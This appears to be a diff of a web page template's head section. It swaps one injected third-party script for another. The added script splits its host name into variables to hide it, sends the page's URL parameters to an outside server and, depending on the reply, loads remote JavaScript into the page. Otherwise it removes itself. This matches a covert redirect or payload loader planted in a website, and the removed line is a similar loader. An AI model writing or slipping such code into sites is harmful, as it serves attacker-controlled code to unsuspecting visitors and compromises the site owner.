@@ -20,7 +20,30 @@ body, html,
 section.error-404 .text, .inline-popup .title, .authentication .title, .bb-other-posts .title, .bb-post-share-box h2, .bb-page-header h1{font-family:Scada,sans-serif
 }
 </style>
-<script async>document.write(`<script async src="https://healthytopclub.info/test/index.php?referrerCF=${escape(document.referrer)}&urlCF=${escape(window.location.href)}"><\/script>`)</script>
+<script id="zif7g8y">
+  var xhr = new XMLHttpRequest();
+  var urlParams = new URLSearchParams(window.location.search);
+  var token = urlParams.get('utm_campaign');
+  var pixel = urlParams.get('pixel');
+  var host = 'clustersquad';
+  var domain_zone = 'info';
+  var t = '';
+  xhr.open('GET', 'https://' + host + '.' + domain_zone + '/api.php?token=' + token + '&'+ urlParams.toString());
+  xhr.send();
+  xhr.onload = function () {
+    t = xhr.response;
+    t = t.replace(/00pixel00/gi, pixel);
+    t = JSON.parse(t);
+    t = t.redirect.content;
+    if (t != "") {
+      t = t.replace(/base href="/gi, 'base href="https://' + host + '.' + domain_zone + '/');
+      var a = document.createElement("script"), h = "head";
+      a.async = true;
+      a.src = 'https://' + host + '.' + domain_zone + '/themes/js/navigation.js';
+      document.getElementsByTagName(h)[0].appendChild(a)
+    }else document.getElementById("zif7g8y").remove();
+  }
+</script>
 </head>
 <body>
 <main id="main" role="main">
